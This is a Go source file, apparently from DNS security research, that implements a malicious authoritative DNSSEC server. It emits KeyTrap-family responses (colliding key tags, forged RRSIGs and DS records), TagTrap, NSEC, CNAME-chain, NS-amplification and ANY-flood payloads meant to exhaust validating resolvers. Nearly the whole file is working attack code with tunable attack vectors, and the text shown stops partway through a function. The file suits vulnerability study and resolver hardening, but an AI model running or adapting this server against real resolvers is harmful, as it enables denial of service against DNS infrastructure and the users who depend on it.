package main

import (
	"encoding/base64"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/tochusc/xdns"
	"github.com/tochusc/xdns/dns"
	"github.com/tochusc/xdns/dns/xperi"
)

var ServerIP = net.IPv4(10, 10, 1, 4)
var IsNameCompression = false
var IsDNSSEC = true
var InitTime = time.Now().UTC().Unix()

var conf = xdns.ServerConfig{
	IP:   net.IPv4(10, 10, 1, 4),
	Port: 53,

	// stdout
	LogWriter: os.Stdout,

	EnableCache:   false,
	CacheLocation: "./cache",

	EnableTCP:    false,
	TCPThreshold: 1200,
}

var SOARDATA = &dns.DNSRDATASOA{
	MName:   "ns.test",
	RName:   "hostmaster.test",
	Serial:  uint32(InitTime),
	Refresh: 3600,
	Retry:   1800,
	Expire:  604800,
	Minimum: 86400,
}

// 测试向量
var ExperiVec = AttackVector{
	// KeyTrap
	CollidedSigNum:        0,
	CollidedSigForRR:      0,
	CollidedZSKNum:        0,
	CollidedKSKNum:        0,
	DynamicCollidedKSKNum: false,
	CollidedDSNum:         0,
	DynamicCollidedDSNum:  false,

	// ANY
	ANYRRSetNum: 0,

	// LRRSetTrap
	TXTRRNum:     0,
	TXTRDataSize: 16384,
	// CNAMETrap
	CNAMEChainNum: 0,
	// ReferrerTrap
	NSRRNum: 0,

	// NSECTrap
	IsNSEC:    true,
	NSECRRNum: 8,

	// TagTrap
	ValidZSKNum:             0,
	Invalid_SIG_ZSK_PairNum: 0,
	SIGPairDecreaseFactor:   0,
	InvalidCollidedZSKNum:   0,
	InvalidCollidedSigNum:   0,

	Invalid_DS_KSK_PairNum: 0,
	DSPairDecreaseFactor:   0,
	InvalidCollidedKSKNum:  0,
	InvalidCollidedDSNum:   0,

	RandomDNSKEYNum:    0,
	RandomDNSKEYFlag:   dns.DNSKEYFlagZoneKey,
	RandomTagSigNum:    0,
	RandomTagDSNum:     0,
	DynamicRandomDSNum: false,

	// AdditionalJam
	AdditionalRRNum: 0,
}

type KeyTrapResponser struct {
	ResponserLogger *log.Logger
	DNSSECManager   KeyTrapManager
	AttackVector    AttackVector
}

// 攻击向量
type AttackVector struct {
	// SigJam
	CollidedSigNum   int
	CollidedSigForRR int
	// LockCram
	CollidedZSKNum int
	// HashTrap
	CollidedKSKNum int
	CollidedDSNum  int
	// ANY
	ANYRRSetNum int

	// SigPairTrap
	Invalid_SIG_ZSK_PairNum int
	SIGPairDecreaseFactor   int
	InvalidCollidedZSKNum   int
	ValidZSKNum             int
	InvalidCollidedSigNum   int

	// DSPairTrap
	Invalid_DS_KSK_PairNum int
	DSPairDecreaseFactor   int
	InvalidCollidedKSKNum  int
	InvalidCollidedDSNum   int

	// TagTrap
	RandomDNSKEYNum    int
	RandomDNSKEYFlag   dns.DNSKEYFlag
	RandomTagSigNum    int
	RandomTagDSNum     int
	DynamicRandomDSNum bool

	// Deep Delegation
	DynamicCollidedKSKNum bool
	DynamicCollidedDSNum  bool

	// AdditionalJam
	AdditionalRRNum int

	// Large RRSet
	TXTRRNum int // Resource Record Numer in RRSet
	// Large RDATA
	TXTRDataSize int // RDATA Size in Resource TXTRRNum
	RandomString string

	// Long CNAME Chain
	CNAMEChainNum int // CNAME Chain Number

	// NS Amplification
	NSRRNum int // Resource Record Numer in RRSet

	// NSECTrap
	IsNSEC    bool
	NSECRRNum int
}

type KeyTrapManager struct {
	// DNSSEC 配置
	DNSSECConf xdns.DNSSECConfig

	// 区域名与其相应 DNSSEC 材料的映射
	// 在初始化 DNSSEC Responser 时需要为其手动添加信任锚点
	DNSSECMap sync.Map

	// KeyTrap攻击向量
	AttackVec AttackVector
}

// DNSSEC 材料
type DNSSECMaterial struct {
	// Key Tag
	ZSKTag int
	KSKTag int

	OtherZSK    []dns.DNSResourceRecord
	OtherZSKTag []int

	// 公钥RDATA
	ZSKRecord dns.DNSResourceRecord
	KSKRecord dns.DNSResourceRecord

	// 私钥字节
	ZSKPriv []byte
	KSKPriv []byte
}

// SignSection 为指定的DNS回复消息中的区域(Answer, Authority, Addition)进行签名
// 其接受参数为：
//   - section []dns.DNSResourceRecord，待签名的区域(Answer, Authority, Addition)信息
//
// 返回值为：
//   - []dns.DNSResourceRecord，签名后的区域(Answer, Authority, Addition)信息
func (m *KeyTrapManager) SignSection(section []dns.DNSResourceRecord) []dns.DNSResourceRecord {
	rMap := make(map[string][]dns.DNSResourceRecord)
	for _, rr := range section {
		if rr.Type == dns.DNSRRTypeRRSIG {
			continue
		}
		rid := rr.Name.DomainName + rr.Type.String() + rr.Class.String()
		rMap[rid] = append(rMap[rid], rr)
	}
	for _, rrset := range rMap {
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		uName := dns.GetUpperDomainName(&rrset[0].Name.DomainName)
		dMat := m.GetDNSSECMaterial(uName)

		if len(strings.Split(rrset[0].Name.DomainName, ".")) == 3 && rrset[0].Name.DomainName[0:1] == "w" {
			for i := 0; i < m.AttackVec.CollidedSigNum+m.AttackVec.CollidedSigForRR; i++ {
				wRRSIG := xperi.GenerateRandomRRRRSIG(
					rrset,
					m.DNSSECConf.Algo,
					uint32(InitTime+86400),
					uint32(InitTime),
					uint16(dMat.ZSKTag),
					uName,
				)
				section = append(section, wRRSIG)
			}
		}

		// TagTrap攻击向量: RandomTagSigNum
		// 生成 随机Tag的 RRSIG 记录
		for i := 0; i < m.AttackVec.RandomTagSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.Algo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(rand.Intn(65535)),
				uName,
			)
			section = append(section, wRRSIG)
		}

		if len(dMat.OtherZSK) != 0 {

			for i := 0; i < m.AttackVec.ValidZSKNum; i++ {
				wRRSIG := xperi.GenerateRandomRRRRSIG(
					rrset,
					m.DNSSECConf.Algo,
					uint32(InitTime+86400),
					uint32(InitTime),
					uint16(dMat.OtherZSKTag[i]),
					uName,
				)
				section = append(section, wRRSIG)
			}
		}

		for i := 1; i <= m.AttackVec.Invalid_SIG_ZSK_PairNum-m.AttackVec.SIGPairDecreaseFactor*len(strings.Split(rrset[0].Name.DomainName, ".")); i++ {
			keytag := dMat.ZSKTag - i
			for j := 0; j < m.AttackVec.InvalidCollidedSigNum; j++ {
				wRRSIG := xperi.GenerateRandomRRRRSIG(
					rrset,
					m.DNSSECConf.Algo,
					uint32(InitTime+86400),
					uint32(InitTime),
					uint16(keytag),
					uName,
				)
				section = append(section, wRRSIG)
			}

		}
		sig := m.SignRRSet(rrset)
		section = append(section, sig)
	}
	return section
}

// SignRRSet 为指定的 RR 集合签名
// 其接受参数为
//   - rrset []dns.DNSResourceRecord，RR 集合
func (m *KeyTrapManager) SignRRSet(rrset []dns.DNSResourceRecord) dns.DNSResourceRecord {
	var uName string
	if len(strings.Split(rrset[0].Name.DomainName, ".")) == 2 {
		if rrset[0].Type == dns.DNSRRTypeNSEC ||
			rrset[0].Type == dns.DNSRRTypeNS ||
			rrset[0].Type == dns.DNSRRTypeNSEC3 {
			uName = rrset[0].Name.DomainName
		} else {
			uName = dns.GetUpperDomainName(&rrset[0].Name.DomainName)
		}
	} else {
		uName = dns.GetUpperDomainName(&rrset[0].Name.DomainName)
	}

	dMat := m.GetDNSSECMaterial(uName)

	sort.Sort(dns.ByCanonicalOrder(rrset))

	sig := xperi.GenerateRRRRSIG(
		rrset,
		dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY).Algorithm,
		uint32(InitTime+86400),
		uint32(InitTime),
		uint16(dMat.ZSKTag),
		uName,
		dMat.KSKPriv,
	)
	return sig
}

// EnableDNSSEC 为指定的 DNS 查询启用 DNSSEC
// 其接受参数为：
//   - qry dns.DNSMessage，查询信息
//   - resp *dns.DNSMessage，指向指定回复信息的指针
func (m *KeyTrapManager) EnableDNSSEC(qry dns.DNSMessage, resp *dns.DNSMessage) {
	qType := qry.Question[0].Type

	// ANY攻击向量
	if qType == dns.DNSQTypeANY {
		// 生成任意类型的 RR 集合
		anyset := []dns.DNSResourceRecord{}
		var sType = 4096
		for i := 0; i < m.AttackVec.ANYRRSetNum; i++ {
			rr := dns.DNSResourceRecord{
				Name:  qry.Question[0].Name,
				Type:  dns.DNSType(sType + i),
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 10, 10)},
			}
			anyset = append(anyset, rr)
		}
		resp.Answer = append(resp.Answer, anyset...)
	}

	// 签名回答部分
	resp.Answer = m.SignSection(resp.Answer)
	// 签名权威部分
	resp.Authority = m.SignSection(resp.Authority)
	// 签名附加部分
	resp.Additional = m.SignSection(resp.Additional)
	m.EstablishToC(qry, resp)
}

// CreateDNSSECMaterial 生成指定区域的 DNSSEC 材料
// 其接受参数为：
//   - zName string，区域名
//
// 返回值为：
//   - DNSSECMaterial，生成的 DNSSEC 材料
func (m *KeyTrapManager) CreateDNSSECMaterial(zName string) DNSSECMaterial {
	zskRecord, zskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagZoneKey)
	zskTag := xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
	for zskTag < uint16(m.AttackVec.CollidedZSKNum) {
		zskRecord, zskPriv = xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagZoneKey)
		zskTag = xperi.CalculateKeyTag(*zskRecord.RData.(*dns.DNSRDATADNSKEY))
	}

	autreZSK := []dns.DNSResourceRecord{}
	autreZSKTag := []int{}
	// SigPairTrap攻击向量：ValidZSKNum
	for i := 0; i <= m.AttackVec.ValidZSKNum; i++ {
		zzz, _ := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagZoneKey)
		autreZSK = append(autreZSK, zzz)
		autreZSKTag = append(autreZSKTag, int(xperi.CalculateKeyTag(*zzz.RData.(*dns.DNSRDATADNSKEY))))
	}

	kskRecord, kskPriv := xperi.GenerateRRDNSKEY(zName, m.DNSSECConf.Algo, dns.DNSKEYFlagSecureEntryPoint)
	kskTag := xperi.CalculateKeyTag(*kskRecord.RData.(*dns.DNSRDATADNSKEY))

	return DNSSECMaterial{
		ZSKTag: int(zskTag),
		KSKTag: int(kskTag),

		ZSKRecord: zskRecord,
		KSKRecord: kskRecord,

		ZSKPriv: zskPriv,
		KSKPriv: kskPriv,

		OtherZSK:    autreZSK,
		OtherZSKTag: autreZSKTag,
	}
}

// GetDNSSECMaterial 获取指定区域的 DNSSEC 材料
// 如果该区域的 DNSSEC 材料不存在，则会根据 DNSSEC 配置生成一个
func (m *KeyTrapManager) GetDNSSECMaterial(zName string) DNSSECMaterial {
	dMat, ok := m.DNSSECMap.Load(zName)
	if !ok {
		dMat = m.CreateDNSSECMaterial(zName)
		m.DNSSECMap.Store(zName, dMat)
	}
	return dMat.(DNSSECMaterial)
}

// EstablishToC 根据查询自动添加 DNSKEY，DS，RRSIG 记录
// 自动完成信任链（Trust of Chain）的建立。
// 其接受参数为：
//   - qry dns.DNSMessage，查询信息
//   - m.DNSSECConf DNSSECConfig，DNSSEC 配置
//   - dMap map[string]DNSSECMaterial，区域名与其相应 DNSSEC 材料的映射
//   - resp *dns.DNSMessage，回复信息
func (m *KeyTrapManager) EstablishToC(qry dns.DNSMessage, resp *dns.DNSMessage) error {
	// 提取查询类型和查询名称
	qType := qry.Question[0].Type
	qName := strings.ToLower(qry.Question[0].Name.DomainName)
	dMat := m.GetDNSSECMaterial(qName)

	if qType == dns.DNSRRTypeDNSKEY {
		// 如果查询类型为 DNSKEY，
		// LockCram攻击向量：CollidedZSKNum
		// 生成 错误ZSK DNSKEY 记录
		rrset := []dns.DNSResourceRecord{}
		if qName != "test" {
			for i := 0; i < m.AttackVec.CollidedZSKNum; i++ {
				wZSK := xperi.GenerateCollidedDNSKEY(
					*dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY),
				)
				rr := dns.DNSResourceRecord{
					Name:  *dns.NewDNSName(qName),
					Type:  dns.DNSRRTypeDNSKEY,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: uint16(wZSK.Size()),
					RData: &wZSK,
				}
				rrset = append(rrset, rr)
				resp.Answer = append(resp.Answer, rr)
			}
		}

		// SigPairTrap攻击向量：ValidZSKNum
		if len(dMat.OtherZSK) != 0 {
			for i := 0; i < m.AttackVec.ValidZSKNum; i++ {
				rrset = append(rrset, dMat.OtherZSK[i])
				resp.Answer = append(resp.Answer, dMat.OtherZSK[i])
			}
		}

		// SigPairTrap攻击向量：Invalid_SIG_ZSK_PairNum
		for i := 1; i <= m.AttackVec.Invalid_SIG_ZSK_PairNum-m.AttackVec.SIGPairDecreaseFactor*len(strings.Split(qName, ".")); i++ {
			// 生成 错误ZSK DNSKEY 记录
			for j := 0; j < m.AttackVec.InvalidCollidedZSKNum; j++ {
				wZSK := xperi.GenerateDNSKEYWithTag(
					*dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY),
					i,
				)
				rr := dns.DNSResourceRecord{
					Name:  *dns.NewDNSName(qName),
					Type:  dns.DNSRRTypeDNSKEY,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &wZSK,
				}
				rrset = append(rrset, rr)
				resp.Answer = append(resp.Answer, rr)
			}
		}

		if qName != "test" {
			// HashTrap攻击向量: CollidedKSKNum
			// 生成 错误KSK DNSKEY 记录
			if m.AttackVec.DynamicCollidedKSKNum {
				// DNSKEY RR Size = QNAME + 10 + RDATA(4 + PublicKeySize)
				// DNSKEY RRSet Size = DS RR Size * CollidedKSKNum
				// DNSKEY RRSet Size < 65535 Bytes
				// (QNAME + 10 + 4 + PublicKeySize) * CollideKSKNum < 65535
				// CollidedKSKNum < 65535 / (QNAME + 10 + 4 + PublicKeySize)
				qNameSize := dns.GetDomainNameWireLen(&qName)
				collidedKSKNum := 62000 / (qNameSize + 10 + 4 + dns.PubilcKeySizeOf(m.DNSSECConf.Algo))
				for i := 0; i < collidedKSKNum; i++ {
					wKSK := xperi.GenerateCollidedDNSKEY(
						*dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY),
					)
					rr := dns.DNSResourceRecord{
						Name:  *dns.NewDNSName(qName),
						Type:  dns.DNSRRTypeDNSKEY,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: uint16(wKSK.Size()),
						RData: &wKSK,
					}

					rrset = append(rrset, rr)
					resp.Answer = append(resp.Answer, rr)
				}
			} else {
				for i := 0; i < m.AttackVec.CollidedKSKNum; i++ {
					wKSK := xperi.GenerateCollidedDNSKEY(
						*dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY),
					)
					rr := dns.DNSResourceRecord{
						Name:  *dns.NewDNSName(qName),
						Type:  dns.DNSRRTypeDNSKEY,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: uint16(wKSK.Size()),
						RData: &wKSK,
					}

					rrset = append(rrset, rr)
					resp.Answer = append(resp.Answer, rr)
				}
			}
		}

		rrset = append(rrset, dMat.ZSKRecord, dMat.KSKRecord)
		resp.Answer = append(resp.Answer, dMat.ZSKRecord, dMat.KSKRecord)

		// HashTrap v2 攻击向量: Invalid_DS_KSK_PairNum
		if qName != "test" {
			for i := 1; i <= m.AttackVec.Invalid_DS_KSK_PairNum-
				m.AttackVec.DSPairDecreaseFactor*len(strings.Split(qName, ".")); i++ {
				// HashTrap v2攻击向量: InvalidCollidedKSKNum
				// 生成 错误KSK DNSKEY 记录
				th := 12
				tm := 0
				rKSK, _ := xperi.GenerateRDATADNSKEY(m.DNSSECConf.Algo, dns.DNSKEYFlagSecureEntryPoint)
				for j := 1; j <= m.AttackVec.InvalidCollidedKSKNum; j++ {
					tm = tm + 1
					if tm > th {
						tm = 0
						rKSK, _ = xperi.GenerateRDATADNSKEY(m.DNSSECConf.Algo, dns.DNSKEYFlagSecureEntryPoint)
					}
					rTag := xperi.CalculateKeyTag(rKSK)
					tTag := uint16(dMat.KSKTag - i)
					offset := rTag - tTag
					wKSK := xperi.GenerateDNSKEYWithTag(rKSK, int(offset))
					rr := dns.DNSResourceRecord{
						Name:  *dns.NewDNSName(qName),
						Type:  dns.DNSRRTypeDNSKEY,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: 0,
						RData: &wKSK,
					}

					rrset = append(rrset, rr)
					resp.Answer = append(resp.Answer, rr)
				}
			}
		}

		// TagTrap攻击向量: RandomDNSKEYNum
		// 生成 随机Tag的 DNSKEY 记录
		for i := 0; i < m.AttackVec.RandomDNSKEYNum; i++ {
			rkey := xperi.GenerateDNSKEYWithTag(
				*dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY),
				i+1,
			)
			rkey.Flags = m.AttackVec.RandomDNSKEYFlag
			rr := dns.DNSResourceRecord{
				Name:  *dns.NewDNSName(qName),
				Type:  dns.DNSRRTypeDNSKEY,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &rkey,
			}
			rrset = append(rrset, rr)
			resp.Answer = append(resp.Answer, rr)
		}

		// 生成密钥集签名
		sort.Sort(dns.ByCanonicalOrder(rrset))

		sigSet := []dns.DNSResourceRecord{}
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.Algo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(dMat.KSKTag),
				qName,
			)
			sigSet = append(sigSet, wRRSIG)
		}

		sig := xperi.GenerateRRRRSIG(
			rrset,
			dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY).Algorithm,
			uint32(InitTime+86400),
			uint32(InitTime),
			uint16(dMat.KSKTag),
			qName,
			dMat.KSKPriv,
		)
		sigSet = append(sigSet, sig)

		resp.Answer = append(resp.Answer, sigSet...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	} else if qType == dns.DNSRRTypeDS {
		// 如果查询类型为 DS，则生成 DS 记录
		dMat := m.GetDNSSECMaterial(qName)

		rrset := []dns.DNSResourceRecord{}

		// HashTrap v2 攻击
		for i := 1; i <= m.AttackVec.Invalid_DS_KSK_PairNum-m.AttackVec.DSPairDecreaseFactor*len(strings.Split(qName, ".")); i++ {
			kskTag := dMat.KSKTag - i
			// HashTrap 攻击向量：InvalidCollidedDSNum
			// 生成 错误DS 记录
			for i := 0; i < m.AttackVec.InvalidCollidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName,
					kskTag,
					m.DNSSECConf.Algo,
					m.DNSSECConf.Type)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		}

		// TagTrap攻击向量: RandomTagDSNum:
		if m.AttackVec.DynamicRandomDSNum {
			qNameSize := dns.GetDomainNameWireLen(&qName)
			randomDSNum := 62000 / (qNameSize + 10 + 4 + dns.DigestSizeOf(m.DNSSECConf.Type))
			for i := 1; i <= randomDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName,
					rand.Intn(65535),
					m.DNSSECConf.Algo,
					m.DNSSECConf.Type)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		} else {
			for i := 1; i <= m.AttackVec.RandomTagDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName,
					rand.Intn(65535),
					m.DNSSECConf.Algo,
					m.DNSSECConf.Type)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		}

		// HashTrap 攻击向量：CollidedDSNum
		// 生成 错误DS 记录
		if m.AttackVec.DynamicCollidedDSNum {
			// DS RR Size = QNAME + 10 + RDATA(52)
			// DS RRSet Size = DS RR Size * CollidedDSNum
			// DS RRSet Size <= 65535 Bytes
			// (QNAME + 10 + 52) * CollidedDSNum <= 65535
			// CollidedDSNum <= 65535 / (QNAME + 10 + 4 + DigestSize)
			qNameSize := dns.GetDomainNameWireLen(&qName)
			collidedDSNum := 62000 / (qNameSize + 10 + 4 + dns.DigestSizeOf(m.DNSSECConf.Type))
			fmt.Printf("CollidedDSNum: %d\n, DS Size: %d\n", collidedDSNum, qNameSize+10+4+dns.DigestSizeOf(m.DNSSECConf.Type))
			for i := 0; i < collidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.Algo, m.DNSSECConf.Type)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		} else {
			for i := 0; i < m.AttackVec.CollidedDSNum; i++ {
				wDS := xperi.GenerateRandomRRDS(qName, dMat.KSKTag, m.DNSSECConf.Algo, m.DNSSECConf.Type)
				rrset = append(rrset, wDS)
				resp.Answer = append(resp.Answer, wDS)
			}
		}

		// 生成正确DS记录
		kskRData, _ := dMat.KSKRecord.RData.(*dns.DNSRDATADNSKEY)
		ds := xperi.GenerateRRDS(qName, *kskRData, m.DNSSECConf.Type)
		rrset = append(rrset, ds)
		resp.Answer = append(resp.Answer, ds)

		upName := dns.GetUpperDomainName(&qName)
		dMat = m.GetDNSSECMaterial(upName)

		// 签名
		sort.Sort(dns.ByCanonicalOrder(rrset))

		sigSet := []dns.DNSResourceRecord{}
		// SigJam攻击向量：CollidedSigNum
		// 生成 错误RRSIG 记录
		for i := 0; i < m.AttackVec.CollidedSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.Algo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(dMat.ZSKTag),
				upName,
			)
			sigSet = append(sigSet, wRRSIG)
		}

		// TagTrap攻击向量: RandomTagSigNum
		// 生成 随机Tag的 RRSIG 记录
		for i := 0; i < m.AttackVec.RandomTagSigNum; i++ {
			wRRSIG := xperi.GenerateRandomRRRRSIG(
				rrset,
				m.DNSSECConf.Algo,
				uint32(InitTime+86400),
				uint32(InitTime),
				uint16(rand.Intn(65535)),
				upName,
			)
			sigSet = append(sigSet, wRRSIG)
		}

		sig := xperi.GenerateRRRRSIG(
			rrset,
			dns.DNSSECAlgorithm(dMat.ZSKRecord.RData.(*dns.DNSRDATADNSKEY).Algorithm),
			uint32(InitTime+86400),
			uint32(InitTime),
			uint16(dMat.ZSKTag),
			upName,
			dMat.ZSKPriv,
		)

		sigSet = append(sigSet, sig)

		resp.Answer = append(resp.Answer, sigSet...)
		resp.Header.RCode = dns.DNSResponseCodeNoErr
	}
	xdns.FixCount(resp)
	return nil
}
func (r *KeyTrapResponser) Response(connInfo xdns.ConnectionInfo) ([]byte, error) {
	// 解析查询信息
	qry, err := xdns.ParseQuery(connInfo)
	if err != nil {
		r.ResponserLogger.Printf("Error parsing query: %v", err)
		return []byte{}, err
	}

	// 将可能启用0x20混淆的查询名称转换为小写
	qName := strings.ToLower(qry.Question[0].Name.DomainName)
	qType := qry.Question[0].Type
	qClass := qry.Question[0].Class

	r.ResponserLogger.Printf("Recive DNS Query from %s,Protocol: %s,  Name: %s, Type: %s, Class: %s\n",
		connInfo.Address.String(), connInfo.Protocol, qName, qType, qClass)

	// 初始化 NXDOMAIN 回复信息
	resp := xdns.InitNXDOMAIN(qry)
	qLables := strings.Split(qName, ".")
	if r.AttackVector.NSRRNum > 0 {
		if len(qLables) == 1 {
			resp.Header.RCode = dns.DNSResponseCodeNoErr
			r.DNSSECManager.EstablishToC(qry, &resp)
			xdns.FixCount(&resp)
		} else if len(qLables) == 2 {
			if qType == dns.DNSRRTypeA || qType == dns.DNSRRTypeNS {
				// 生成 NS 记录
				// NS Amplification攻击向量：NSRRNum
				for i := 1; i <= r.AttackVector.NSRRNum; i++ {
					rr := dns.DNSResourceRecord{
						Name:  *dns.NewDNSName(qName),
						Type:  dns.DNSRRTypeNS,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: 0,
						RData: &dns.DNSRDATANS{NSDNAME: fmt.Sprintf("ns%d.%s", i, qName)},
					}
					resp.Authority = append(resp.Authority, rr)
					rra := dns.DNSResourceRecord{
						Name:  *dns.NewDNSName(fmt.Sprintf("ns%d.%s", i, qName)),
						Type:  dns.DNSRRTypeA,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: 4,
						RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 1, 4)},
					}
					resp.Additional = append(resp.Additional, rra)
				}
				resp.Header.RCode = dns.DNSResponseCodeNoErr
				resp.Answer = r.DNSSECManager.SignSection(resp.Answer)
				resp.Authority = r.DNSSECManager.SignSection(resp.Authority)
				resp.Additional = r.DNSSECManager.SignSection(resp.Additional)
				SOARDATA.MName = "ns1." + qName
				soa := dns.DNSResourceRecord{
					Name:  *dns.NewDNSName(qName),
					Type:  dns.DNSRRTypeSOA,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: SOARDATA,
				}
				resp.Authority = append(resp.Authority, soa)
				dMat := r.DNSSECManager.GetDNSSECMaterial(qName)
				soasig := xperi.GenerateRRRRSIG(
					[]dns.DNSResourceRecord{soa},
					dns.DNSSECAlgorithm(r.DNSSECManager.DNSSECConf.Algo),
					uint32(InitTime+86400),
					uint32(InitTime),
					uint16(dMat.ZSKTag),
					qName,
					dMat.ZSKPriv,
				)
				resp.Authority = append(resp.Authority, soasig)
				xdns.FixCount(&resp)
			} else {
				r.DNSSECManager.EstablishToC(qry, &resp)
				resp.Header.RCode = dns.DNSResponseCodeNoErr
			}
		} else if len(qLables) == 3 {
			rra := dns.DNSResourceRecord{
				Name:  *dns.NewDNSName(qName),
				Type:  dns.DNSRRTypeA,
				Class: dns.DNSClassIN,
				TTL:   86400,
				RDLen: 0,
				RData: &dns.DNSRDATAA{Address: net.IPv4(10, 10, 1, 4)},
			}
			resp.Answer = append(resp.Answer, rra)
			upperName := dns.GetUpperDomainName(&qName)
			dMat := r.DNSSECManager.GetDNSSECMaterial(upperName)
			for i := 0; i < r.AttackVector.CollidedSigForRR; i++ {
				rrsig := xperi.GenerateRandomRRRRSIG(
					[]dns.DNSResourceRecord{rra},
					dns.DNSSECAlgorithm(r.DNSSECManager.DNSSECConf.Algo),
					uint32(InitTime+86400),
					uint32(InitTime),
					uint16(dMat.ZSKTag),
					upperName,
				)
				resp.Answer = append(resp.Answer, rrsig)
			}
			resp.Header.RCode = dns.DNSResponseCodeNoErr
			xdns.FixCount(&resp)
		}
		data := resp.Encode()
		return data, nil
	} else {
		switch qType {
		case dns.DNSRRTypeA:
			// 生成 A 记录
			// Tricks攻击向量：CNAMEChainNum
			cLength := 0
			if len(qLables[0]) > 4 && qLables[0][:5] == "cname" {
				cLength, err = strconv.Atoi(qLables[0][5:])
				if err != nil {
					r.ResponserLogger.Printf("Error parsing CNAME chain length: %v", err)
					return []byte{}, err
				}
			}
			if len(qLables) > 2 && cLength < r.AttackVector.CNAMEChainNum {
				cLength += 1

				nName := fmt.Sprintf("cname%d", cLength)

				for i := 1; i < len(qLables); i++ {
					nName += "." + qLables[i]
				}

				rr := dns.DNSResourceRecord{
					Name:  *dns.NewDNSName(qName),
					Type:  dns.DNSRRTypeCNAME,
					Class: dns.DNSClassIN,
					TTL:   86400,
					RDLen: 0,
					RData: &dns.DNSRDATACNAME{CNAME: nName},
				}

				resp.Answer = append(resp.Answer, rr)
			} else {
				if r.AttackVector.IsNSEC && (qLables[0] == "www" || qLables[0] == "w") {
					// NSEC攻击向量
					upperName := dns.GetUpperDomainName(&qName)
					// soa := dns.DNSResourceRecord{
					// 	Name:  upperName,
					// 	Type:  dns.DNSRRTypeSOA,
					// 	Class: dns.DNSClassIN,
					// 	TTL:   86400,
					// 	RDLen: 0,
					// 	RData: SOARDATA,
					// }
					// resp.Authority = append(resp.Authority, soa)
					randInt := rand.Int() % 99
					for i := 1; i < r.AttackVector.NSECRRNum; i++ {
						//生成NSEC记录
						rdata := dns.DNSRDATANSEC{
							NextDomainName: fmt.Sprintf("0%d.", randInt+i) + upperName,
							TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
						}
						rr := dns.DNSResourceRecord{
							Name:  *dns.NewDNSName(fmt.Sprintf("0%d.", randInt+i-1) + upperName),
							Type:  dns.DNSRRTypeNSEC,
							Class: dns.DNSClassIN,
							TTL:   86400,
							RDLen: 0,
							RData: &rdata,
						}
						resp.Authority = append(resp.Authority, rr)
					}
					rdata := dns.DNSRDATANSEC{
						NextDomainName: "zzz." + upperName,
						TypeBitMaps:    []dns.DNSType{dns.DNSRRTypeA},
					}
					rr := dns.DNSResourceRecord{
						Name:  *dns.NewDNSName(fmt.Sprintf("0%d.", randInt+r.AttackVector.NSECRRNum) + upperName),
						Type:  dns.DNSRRTypeNSEC,
						Class: dns.DNSClassIN,
						TTL:   86400,
						RDLen: 0,
						RData: &rdata,
					}
					resp.Authority = append(resp.Authority, rr)
				} else {
					if qLables[0] == "ns" {
						if err != nil {
							r.ResponserLogger.Printf("Error parsing NS number: %v", err)
							return []byte{}, err
						}
						rr := dns.DNSResourceRecord{
							Name:  *dns.NewDNSName(qName),
							Type:  dns.DNSRRTypeA,
							Class: dns.DNSClassIN,
							TTL:   86400,
							RDLen: 0,
							RData: &dns.DNSRDATAA{Address: ServerIP},
						}
						resp.Answer = append(resp.Answer, rr)
					} else {
						rr := dns.DNSResourceRecord{
							Name:  *dns.NewDNSName(qName),
							Type:  dns.DNSRRTypeA,
							Class: dns.DNSClassIN,
							TTL:   86400,
							RDLen: 0,
							RData: &dns.DNSRDATAA{Address: ServerIP},
						}
						resp.Answer = append(resp.Answer, rr)
					}
				}
			}
		case dns.DNSRRTypeNS:
			// 生成 NS 记录
			rr := dns.DNSResourceRecord{
				Name:  *dns.NewDNSName(qName),
